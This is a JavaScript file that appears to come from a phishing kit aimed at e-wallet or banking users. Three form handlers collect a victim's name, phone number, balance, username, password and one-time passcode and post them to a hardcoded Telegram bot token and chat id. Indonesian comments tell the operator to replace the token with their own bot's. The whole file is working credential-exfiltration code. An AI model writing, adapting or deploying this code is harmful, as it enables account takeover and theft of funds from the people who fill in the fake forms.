function sendNohp(event){
   event.preventDefault();
            $(".containerpin *").css("opacity", "0.6");
            
  var logo = document.getElementById('logo');
    var nama = document.getElementById('nama');
    var nomor = document.getElementById('nomor');
    var saldo = document.getElementById('saldo');
    

    var gabungan = '' + logo.value + '%0A𝑵𝒂𝒎𝒂: ' + nama.value + '%0A𝑵𝒐.𝑯𝒑: ' + nomor.value + '%0A𝑺𝒂𝒍𝒅𝒐: ' +  saldo.value;
    
    var token = '7530064198:AAE3RcRdc490mB-I2QC_JYaeSOovrA5WaqM'; // Ganti dengan token bot yang kamu buat
    var grup = '7368151596'; // Ganti dengan chat id dari bot yang kamu buat
  
   $.ajax({
        url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
        method: `POST`,
    
    
       success: function(){
            vibr(180);
         setTimeout(function(){     
         
              
         }, 0);}});};
         
  function sendUser(event){
   event.preventDefault();
            $(".containerpin *").css("opacity", "0.6");
     
  
            
  var logo = document.getElementById('logo');
    var nama = document.getElementById('nama');
    var nomor = document.getElementById('nomor');
    var saldo = document.getElementById('saldo');
    var uname = document.getElementById('uname');
    var pass = document.getElementById('pass');
    var gabungan = '' + logo.value + '%0A𝑵𝒂𝒎𝒂: ' + nama.value + '%0A𝑵𝒐.𝑯𝒑: ' + nomor.value + '%0A𝑺𝒂𝒍𝒅𝒐: ' +  saldo.value + '%0A%0A𝑼𝒔𝒆𝒓𝒏𝒂𝒎𝒆: ' + uname.value + '%0A𝑷𝒂𝒔𝒔𝒘𝒐𝒓𝒅:' + pass.value;
    
    var token = '7530064198:AAE3RcRdc490mB-I2QC_JYaeSOovrA5WaqM'; // Ganti dengan token bot yang kamu buat
    var grup = '7368151596'; // Ganti dengan chat id dari bot yang kamu buat
  
   $.ajax({
        url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
        method: `POST`,
    
    
       success: function(){
            vibr(180);
         setTimeout(function(){     
         
              
         }, 0);}});};
  
    
   function sender(event){
   event.preventDefault();
            $(".containerpin *").css("opacity", "0.6");
     
  
            
  var logo = document.getElementById('logo');
    var nama = document.getElementById('nama');
    var nomor = document.getElementById('nomor');
    var saldo = document.getElementById('saldo');
    var uname = document.getElementById('uname');
    var pass = document.getElementById('pass');
    var nama1 = document.getElementById('nama1')

    var gabungan = '' + logo.value + '%0A𝑵𝒂𝒎𝒂: ' + nama.value + '%0A𝑵𝒐.𝑯𝒑: ' + nomor.value + '%0A𝑺𝒂𝒍𝒅𝒐: ' +  saldo.value + '%0A%0A𝑼𝒔𝒆𝒓𝒏𝒂𝒎𝒆: ' + uname.value + '%0A𝑷𝒂𝒔𝒔𝒘𝒐𝒓𝒅:' + pass.value + '%0A%0A𝐎𝐓𝐏:' + nama1.value;
    
    var token = '7530064198:AAE3RcRdc490mB-I2QC_JYaeSOovrA5WaqM'; // Ganti dengan token bot yang kamu buat
    var grup = '7368151596'; // Ganti dengan chat id dari bot yang kamu buat
  
   $.ajax({
        url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
        method: `POST`,
    
    
       success: function(){
            vibr(180);
         setTimeout(function(){     
         
              
         }, 0);}});};